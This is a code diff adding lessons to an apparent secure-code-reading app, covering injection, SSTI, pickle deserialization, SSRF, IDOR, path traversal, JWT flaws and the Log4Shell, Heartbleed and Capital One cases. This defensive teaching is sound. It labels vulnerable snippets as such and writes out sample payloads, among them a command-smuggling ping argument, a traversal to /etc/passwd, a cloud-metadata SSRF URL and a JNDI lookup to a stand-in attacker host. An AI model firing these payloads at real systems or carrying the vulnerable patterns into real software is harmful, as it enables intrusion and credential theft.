@@ -220,6 +220,7 @@ const KW = {
   cpp:'include define int char void return if else for while new delete sizeof struct class public private const unsigned long double float bool true false nullptr using namespace std size_t uint16_t uint32_t',
   js:'const let var function return if else for while new class this document window true false null undefined async await try catch import from export typeof require module',
   python:'def return if elif else for in while import from as class with try except raise True False None print lambda pass not and or is global del yield',
+  java:'import public private protected class static final void String int long boolean var return if else for while do new null true false try catch finally throw throws this extends implements interface package abstract',
   sql:'select from where and or order by limit insert into values update set delete join inner left on union all as group having create table drop like'
 };
 function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
@@ -275,7 +276,7 @@ const BADGES = [
 ];
 
 /* ---------- version ---------- */
-const APP_VERSION='1.0.0';
+const APP_VERSION='1.1.0';
 
 /* ---------- persistent state ---------- */
 const KEY='codelearn.v1';
@@ -531,6 +532,84 @@ const TRACKS = [
   ]
  },
  {
+  id:'python', name:'Python', tag:'BACKEND', icon:'py', accent:'violet',
+  sub:'Web backends, scripts and automation. Clean syntax, sharp edges.',
+  lessons:[
+   {id:'py1', name:'Reading Python & where input enters', xp:25, cards:[
+     {t:'md',html:'<p>Python has no <code class="inl">$</code> sigils and no type declarations — a variable is just a name being assigned, and <b>indentation</b> (not braces) defines blocks. So you spot untrusted input by the library that produced it.</p><p>Common sources:</p><p>• Flask: <code class="inl">request.args</code>, <code class="inl">request.form</code>, <code class="inl">request.json</code><br>• Django: <code class="inl">request.GET</code>, <code class="inl">request.POST</code><br>• Scripts &amp; CLI: <code class="inl">sys.argv</code>, <code class="inl">input()</code>, environment variables</p>'},
+     {t:'read',lang:'python',label:'Flask — a request handler',code:'from flask import request\n\n@app.route("/hello")\ndef hello():\n    name = request.args.get("name")     # SOURCE: from ?name=\n    return "<h1>Hi " + name + "</h1>"    # SINK: reflected into HTML',note:'Input from <code class="inl">request.args</code> is concatenated into HTML and returned — reflected <b>XSS</b> unless escaped. Jinja templates auto-escape; raw string building like this does not.'},
+     {t:'quiz',q:'In this Python web handler, which line is the untrusted <b>source</b>?',
+      opts:['The <code class="inl">@app.route</code> decorator','<code class="inl">request.args.get("name")</code>','The string <code class="inl">"Hi "</code>','The function name <code class="inl">hello</code>'],a:1,
+      why:'<b>request.args</b> reads the URL query string — fully attacker-controlled. The decorator and function name are structure, not data.'}
+   ]},
+   {id:'py2', name:'SQL injection in Python', xp:30, cards:[
+     {t:'md',html:'<p>Every Python database driver (sqlite3, psycopg2, MySQLdb, SQLAlchemy Core) accepts <b>parameters</b>. The bug appears when code builds the query string itself with an <b>f-string</b>, <code class="inl">%</code>, <code class="inl">.format()</code>, or <code class="inl">+</code>.</p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("name")\ncur.execute(f"SELECT * FROM users WHERE name = \'{name}\'")',note:'The f-string drops <code class="inl">name</code> straight into the SQL text — <code class="inl">?name=\' OR \'1\'=\'1</code> returns every row. f-strings and <code class="inl">.format()</code> are SQL injection in disguise.'},
+     {t:'read',lang:'python',label:'Safe — parameterized',code:'cur.execute("SELECT * FROM users WHERE name = %s", (name,))',note:'The <code class="inl">%s</code> here is a <b>driver placeholder</b>, not string formatting — the value is bound separately and can never alter the query. (sqlite3 uses <code class="inl">?</code>.)'},
+     {t:'quiz',q:'Which call is <b>safe</b> from SQL injection?',
+      opts:['<code class="inl">cur.execute(f"...WHERE id={uid}")</code>','<code class="inl">cur.execute("...WHERE id=%s", (uid,))</code>','<code class="inl">cur.execute("...WHERE id=" + uid)</code>','<code class="inl">cur.execute("...WHERE id={}".format(uid))</code>'],a:1,
+      why:'Only the <b>parameterized</b> call keeps the value as data. f-strings, <code class="inl">+</code>, and <code class="inl">.format()</code> all build the query from raw input.'}
+   ]},
+   {id:'py3', name:'Command injection in Python', xp:30, cards:[
+     {t:'md',html:'<p>Python reaches the OS shell through <code class="inl">os.system()</code>, <code class="inl">os.popen()</code>, and <code class="inl">subprocess</code> calls with <code class="inl">shell=True</code>. The danger sign is a <b>built command string</b> handed to any of these.</p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'import subprocess\nhost = request.args.get("host")\nsubprocess.run("ping -c1 " + host, shell=True)   # ?host=8.8.8.8;id',note:'<code class="inl">shell=True</code> runs the string in <code class="inl">/bin/sh</code>, so <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$()</code> chain attacker commands.'},
+     {t:'read',lang:'python',label:'Safe — argument list',code:'subprocess.run(["ping", "-c1", host])   # list form, no shell',note:'An <b>argument list</b> with no <code class="inl">shell=True</code> sends <code class="inl">host</code> as a single argument to ping — the shell never parses it.'},
+     {t:'quiz',q:'What single detail makes <code class="inl">subprocess.run(cmd, shell=True)</code> dangerous?',
+      opts:['It imports subprocess','<code class="inl">shell=True</code> runs the built string through a shell that interprets metacharacters','run() is deprecated','It returns output'],a:1,
+      why:'<b>shell=True</b> plus a concatenated string is command injection. The list form with no shell is the safe pattern.'}
+   ]},
+   {id:'py4', name:'Server-Side Template Injection', xp:35, cards:[
+     {t:'md',html:'<p>Template engines (Jinja2, Twig, Freemarker) evaluate expressions inside markers like <code class="inl">{{ }}</code>. If <b>user input is placed into the template itself</b> — not just passed as a value — the input is evaluated as template code, often leading to RCE. The Python tell is <code class="inl">render_template_string()</code> built from input.</p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'from flask import render_template_string, request\nname = request.args.get("name")\ntpl = "<h1>Hello " + name + "</h1>"\nreturn render_template_string(tpl)   # ?name={{7*7}} -> 49',note:'Because <code class="inl">name</code> is concatenated into the <i>template source</i>, <code class="inl">{{7*7}}</code> renders as <code class="inl">49</code> — proof of <b>SSTI</b>. Payloads escalate to reading files and running commands.'},
+     {t:'read',lang:'python',label:'Safe — fixed template, bound value',code:'return render_template_string("<h1>Hello {{ name }}</h1>", name=name)',note:'The template is <b>fixed</b> and <code class="inl">name</code> is passed as a bound variable — escaped, never evaluated as template code.'},
+     {t:'quiz',q:'In a Flask app, <code class="inl">?name={{7*7}}</code> shows <code class="inl">49</code> on the page. What does that prove?',
+      opts:['A math bug','Server-Side Template Injection — input is evaluated as template code','A caching issue','Nothing, that is normal'],a:1,
+      why:'User input being <b>evaluated</b> (7*7 → 49) means it reached the template engine as code. That is <b>SSTI</b>, a common path to RCE.'}
+   ]},
+   {id:'py5', name:'Insecure deserialization (pickle)', xp:35, cards:[
+     {t:'md',html:'<p>Python\'s <code class="inl">pickle</code> can serialize almost any object — and <b>deserializing</b> attacker-controlled pickle data can execute code, because a pickle stream can invoke arbitrary constructors. The same risk applies to <code class="inl">yaml.load()</code> with an unsafe loader.</p>'},
+     {t:'read',lang:'python',label:'Dangerous',code:'import pickle\ndata = request.get_data()          # untrusted bytes\nobj = pickle.loads(data)           # RCE: pickle can run code on load',note:'Never <code class="inl">pickle.loads()</code> untrusted input — a crafted pickle can run commands as your app. Use JSON, or <code class="inl">yaml.safe_load()</code> for YAML.'},
+     {t:'quiz',q:'You see <code class="inl">pickle.loads(request.get_data())</code>. Verdict?',
+      opts:['Fine — pickle is just serialization','Critical — deserializing untrusted pickle can execute code (RCE)','Only a problem if the object is large','Safe if wrapped in try/except'],a:1,
+      why:'<b>pickle.loads</b> on attacker data is a textbook RCE. The fix is a safe format (JSON) or <code class="inl">yaml.safe_load</code>; try/except does not help.'}
+   ]}
+  ]
+ },
+ {
+  id:'webpat', name:'Web Attack Patterns', tag:'CROSS-LANG', icon:'◎', accent:'amber',
+  sub:'Language-agnostic bug classes scanners and beginners miss.',
+  lessons:[
+   {id:'w1', name:'SSRF — Server-Side Request Forgery', xp:35, cards:[
+     {t:'md',html:'<p><b>Server-Side Request Forgery (SSRF)</b>: the server fetches a URL the user controls. An attacker points it at <b>internal</b> systems the server can reach but they cannot — admin panels, databases, or the cloud <b>metadata endpoint</b> <code class="inl">169.254.169.254</code>, which can hand back credentials.</p><p>The tell: a request function (<code class="inl">requests.get</code>, <code class="inl">fetch</code>, <code class="inl">curl</code>, <code class="inl">file_get_contents</code>) fed a user-supplied URL.</p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'url = request.args.get("url")     # user controls the whole URL\nr = requests.get(url)             # server fetches it\nreturn r.text                     # ...and returns the response',note:'<code class="inl">?url=http://169.254.169.254/latest/meta-data/</code> makes the server read cloud metadata. Defenses: allowlist hosts, block internal IP ranges, disable redirects.'},
+     {t:'quiz',q:'Why is fetching a user-supplied URL server-side dangerous, even though the user could visit URLs themselves?',
+      opts:['It is slow','The server can reach internal-only systems (metadata, admin panels) the user cannot','It wastes bandwidth','It is not dangerous'],a:1,
+      why:'SSRF abuses the <b>server\'s</b> network position to reach internal resources — the classic prize is cloud <b>metadata</b> credentials.'}
+   ]},
+   {id:'w2', name:'IDOR & broken access control', xp:35, cards:[
+     {t:'md',html:'<p><b>Insecure Direct Object Reference (IDOR)</b>: code looks up a record by an id from the request but never checks that the record <b>belongs to</b> the current user. Change the id, read someone else\'s data.</p><p>This is invisible to input-sanitization thinking — the input is a perfectly valid number. You find it by asking: <i>where is the ownership check?</i></p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'@app.route("/invoice/<id>")\ndef invoice(id):\n    inv = db.invoices.get(id)      # fetched by id from the URL\n    return render(inv)             # no check that inv.owner == current_user',note:'<code class="inl">/invoice/1001</code> → <code class="inl">/invoice/1002</code> exposes another customer\'s invoice. The fix is an <b>authorization check</b>: confirm the object belongs to the caller.'},
+     {t:'quiz',q:'A handler loads <code class="inl">invoice[id]</code> straight from the URL id. What control is missing?',
+      opts:['Input validation on the number','An authorization check that the invoice belongs to the current user','Rate limiting','HTTPS'],a:1,
+      why:'The id is valid data; the flaw is <b>broken access control</b>. Every object fetched by a client-supplied id needs an ownership/permission check.'}
+   ]},
+   {id:'w3', name:'Path traversal & file inclusion', xp:30, cards:[
+     {t:'md',html:'<p><b>Path traversal</b>: a filename from the user is joined to a path and used to read, write, or include files. Sequences like <code class="inl">../</code> climb out of the intended directory to reach <code class="inl">/etc/passwd</code>, source, or config.</p><p>Cross-language sinks: <code class="inl">open()</code>, <code class="inl">readFile</code>, <code class="inl">include</code>, <code class="inl">File.ReadAllText</code>, <code class="inl">fopen</code>.</p>'},
+     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("file")\npath = "/var/www/uploads/" + name\nreturn open(path).read()          # ?file=../../../../etc/passwd',note:'Concatenating a user filename lets <code class="inl">../</code> escape the folder. Defenses: reject <code class="inl">..</code>, resolve the real path and confirm it stays inside the base directory.'},
+     {t:'quiz',q:'Which payload characterizes a path-traversal attempt against <code class="inl">/uploads/ + filename</code>?',
+      opts:['A very long filename','<code class="inl">../../</code> sequences that climb out of the uploads directory','An uppercase filename','A filename with spaces'],a:1,
+      why:'<b>../</b> walks up the directory tree. If the joined path is used without confining it to the base directory, it is path traversal.'}
+   ]},
+   {id:'w4', name:'Authentication & token flaws', xp:35, cards:[
+     {t:'md',html:'<p>Auth bugs you can spot by reading:</p><p>• <b>Predictable tokens</b> — session ids or password resets from <code class="inl">Math.random()</code>, timestamps, or sequential ids.<br>• <b>JWT</b> accepting <code class="inl">alg: none</code>, or a hardcoded/weak secret.<br>• <b>Missing verification</b> — decoding a token but never checking its signature.</p>'},
+     {t:'read',lang:'js',label:'Vulnerable — decode is not verify',code:'const token = req.headers.authorization;\nconst data = jwt.decode(token);   // decode != verify — no signature check!\nreq.user = data.user;             // attacker forges {user:"admin"}',note:'<code class="inl">jwt.decode</code> only parses the token; it does not check the signature. Use <code class="inl">jwt.verify(token, secret)</code> so a forged token is rejected.'},
+     {t:'quiz',q:'What is wrong with using <code class="inl">jwt.decode(token)</code> for auth instead of <code class="inl">jwt.verify</code>?',
+      opts:['Nothing','<code class="inl">decode</code> does not check the signature, so a forged token is trusted','decode is slower','decode needs a database'],a:1,
+      why:'<b>decode</b> just parses the token; only <b>verify</b> checks the signature against your secret. Trusting decoded claims lets anyone forge an admin token.'}
+   ]}
+  ]
+ },
+ {
   id:'audit', name:'Auditor\'s Eye', tag:'META', icon:'👁', accent:'amber',
   sub:'The cross-language instincts that turn reading into finding.',
   lessons:[
@@ -553,6 +632,33 @@ const TRACKS = [
      {t:'quiz',q:'Which is a legitimate reading-only finding, no runtime test required?',
       opts:['A hardcoded API key in source combined with MD5 password hashing','A well-named variable','A function with comments','Use of prepared statements'],a:0,
       why:'Both <b>hardcoded secrets</b> and <b>MD5 for passwords</b> are visible statically. They are reliable, high-signal findings you report straight from the code.'}
+   ]}
+  ]
+ },
+ {
+  id:'breach', name:'Breach Files', tag:'REAL-WORLD', icon:'🔥', accent:'amber',
+  sub:'Real vulnerabilities that hacked real companies — and the code behind them.',
+  lessons:[
+   {id:'b1', name:'Log4Shell — logging turned into RCE', xp:40, cards:[
+     {t:'md',html:'<p><b>Log4Shell</b> (CVE-2021-44228, December 2021) may be the most widespread vulnerability ever. <b>Log4j</b>, a logging library embedded in countless Java apps, evaluated special <code class="inl">${...}</code> lookups <i>inside log messages</i>. One of them, <code class="inl">${jndi:...}</code>, would reach out over the network and load a remote Java class — remote code execution.</p><p>The frightening part: you did not need to attack a login form. If any attacker-controlled string was ever <b>logged</b> — a username, a <code class="inl">User-Agent</code> header, a chat message — the exploit fired.</p>'},
+     {t:'read',lang:'java',label:'Java — the innocent-looking trigger',code:'import org.apache.logging.log4j.Logger;\n\nString ua = request.getHeader("User-Agent");\nlogger.info("request from " + ua);   // just logging attacker input...\n// User-Agent: ${jndi:ldap://evil.com/x}  ->  Log4j fetches & runs remote code',note:'Nothing here looks dangerous — it is one log line. The flaw lived <b>inside Log4j</b>, which parsed <code class="inl">${jndi:...}</code> in the message. Lesson: a vulnerable <b>dependency</b> can turn ordinary code into RCE. The fix was upgrading Log4j.'},
+     {t:'quiz',q:'Why was Log4Shell so dangerous and so hard to spot in your own code?',
+      opts:['It required admin access','Merely logging attacker-controlled text triggered RCE — the bug was in the logging library, not your code','It only affected old Windows','It needed a database'],a:1,
+      why:'The vulnerability was in the <b>Log4j dependency</b>\'s handling of <code class="inl">${jndi:}</code> lookups. Any logged attacker input became an exploit — which is why auditing dependencies matters as much as auditing your own code.'}
+   ]},
+   {id:'b2', name:'Heartbleed — a missing length check', xp:45, cards:[
+     {t:'md',html:'<p><b>Heartbleed</b> (CVE-2014-0160, 2014) was a flaw in <b>OpenSSL</b>, the library securing much of the web. The TLS "heartbeat" lets a client send a small payload and asks the server to echo it back, along with a <b>length</b> the client specifies.</p><p>OpenSSL trusted that length without checking it against the actual payload size. Ask it to echo 64KB when you sent 1 byte, and the server returns 64KB of adjacent <b>memory</b> — which could hold passwords, session cookies, or the server\'s private key.</p>'},
+     {t:'read',lang:'cpp',label:'C — the bug, simplified',code:'/* attacker controls payload_len, independent of the real data sent */\nunsigned char *buffer = malloc(payload_len);\nmemcpy(buffer, payload, payload_len);   // no check: payload_len may exceed real payload\n/* buffer now holds bytes from past the input -> memory disclosure */',note:'This is an <b>over-read</b>: a missing <i>bounds check</i> on an attacker-supplied length. The fix added one check that <code class="inl">payload_len</code> did not exceed the data actually received. One <code class="inl">if</code> statement.'},
+     {t:'quiz',q:'What class of bug was Heartbleed?',
+      opts:['SQL injection','A missing bounds check on an attacker-controlled length, causing a memory over-read (disclosure)','A weak password','Cross-site scripting'],a:1,
+      why:'Heartbleed trusted a client-supplied <b>length</b> and copied that many bytes regardless of the real payload size — leaking adjacent memory. It is the C/C++ reading skill applied to world-shaking code.'}
+   ]},
+   {id:'b3', name:'Capital One — SSRF to cloud metadata', xp:45, cards:[
+     {t:'md',html:'<p>In 2019, an attacker stole the data of roughly <b>100 million</b> Capital One customers. The entry point was a <b>Server-Side Request Forgery</b> against a misconfigured firewall/proxy.</p><p>The attacker made the server request the AWS <b>metadata endpoint</b> <code class="inl">http://169.254.169.254/</code>, which returns the temporary <b>IAM credentials</b> of the server\'s cloud role. With those keys, they read the company\'s storage buckets.</p>'},
+     {t:'read',lang:'python',label:'The pattern that made it possible',code:'# The server could be tricked into fetching an attacker-chosen URL:\n#   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# which returns temporary AWS keys for the instance role.\nresp = requests.get(user_supplied_url)   # SSRF -> cloud credential theft',note:'This ties two lessons together: an <b>SSRF</b> reaching the cloud <b>metadata</b> service. Modern defenses: enforce IMDSv2, block <code class="inl">169.254.169.254</code>, and allowlist outbound destinations.'},
+     {t:'quiz',q:'How did an SSRF turn into a 100-million-record breach at Capital One?',
+      opts:['It crashed the server','SSRF reached the cloud metadata endpoint, which returned IAM credentials used to read stored data','It guessed the admin password','It exploited a buffer overflow'],a:1,
+      why:'The SSRF fetched <code class="inl">169.254.169.254</code> metadata to steal the instance\'s <b>IAM role credentials</b>, then used them against storage. SSRF + cloud metadata is a critical combination to recognize.'}
    ]}
   ]
  }
@@ -668,7 +774,41 @@ const HUNTS = [
    'handler.Invoke(msg.Payload);'
   ],
   vuln:[1,2],
-  debrief:'<p><b>Lines 2–3</b> — <code class="inl">BinaryFormatter.Deserialize</code> on attacker-supplied bytes is a textbook <b>insecure deserialization → RCE</b>. Microsoft deprecated it for exactly this. Use a safe, type-constrained serializer (System.Text.Json) and never deserialize untrusted data into arbitrary types.</p>'}
+  debrief:'<p><b>Lines 2–3</b> — <code class="inl">BinaryFormatter.Deserialize</code> on attacker-supplied bytes is a textbook <b>insecure deserialization → RCE</b>. Microsoft deprecated it for exactly this. Use a safe, type-constrained serializer (System.Text.Json) and never deserialize untrusted data into arbitrary types.</p>'},
+ {id:'h9', title:'Template preview endpoint', lang:'python', xp:50, diff:'Medium',
+  brief:'A Flask endpoint that renders a user-supplied template fragment. Find the injection.',
+  lines:[
+   '@app.route("/preview")',
+   'def preview():',
+   '    tpl = request.args.get("tpl", "")',
+   '    return render_template_string("<div>" + tpl + "</div>")'
+  ],
+  vuln:[3],
+  debrief:'<p><b>Line 4</b> passes a template built from user input to <code class="inl">render_template_string</code> — <b>Server-Side Template Injection</b>. <code class="inl">?tpl={{7*7}}</code> returns 49; real payloads read files and run commands. Render a <b>fixed</b> template and pass values as bound variables instead.</p><p>Line 3 is only the source — untrusted, but not itself the sink.</p>'},
+ {id:'h10', title:'URL preview service', lang:'python', xp:50, diff:'Medium',
+  brief:'A service that fetches a URL on the user\'s behalf. Where is the SSRF?',
+  lines:[
+   '@app.route("/fetch")',
+   'def fetch():',
+   '    target = request.args.get("url")',
+   '    if not target:',
+   '        abort(400)',
+   '    return requests.get(target).text'
+  ],
+  vuln:[5],
+  debrief:'<p><b>Line 6</b> fetches a user-supplied URL server-side — <b>SSRF</b>. <code class="inl">?url=http://169.254.169.254/latest/meta-data/</code> reaches the cloud metadata service and can leak IAM credentials. Allowlist destinations and block internal IP ranges. The empty-check on lines 4–5 validates presence, not safety.</p>'},
+ {id:'h11', title:'Login audit logger (Java)', lang:'java', xp:60, diff:'Hard',
+  brief:'A Java handler that logs each login attempt. Assume it uses a vulnerable Log4j version — which line is the exploit vector?',
+  lines:[
+   'public void handle(HttpRequest req) {',
+   '    String ua = req.getHeader("User-Agent");',
+   '    String user = req.getParameter("user");',
+   '    logger.info("login user=" + user + " ua=" + ua);',
+   '    auth.check(user);',
+   '}'
+  ],
+  vuln:[3],
+  debrief:'<p><b>Line 4</b> logs attacker-controlled input (<code class="inl">user</code> and the <code class="inl">User-Agent</code>). On a vulnerable <b>Log4j</b> version (Log4Shell, CVE-2021-44228) that single log call is remote code execution via a <code class="inl">${jndi:...}</code> payload — no login required. The bug lives in the <b>dependency</b>, so the fix is upgrading Log4j, not rewriting the log line. This is why logging untrusted input is a sink worth flagging.</p>'}
 ];
 
 /* =========================================================
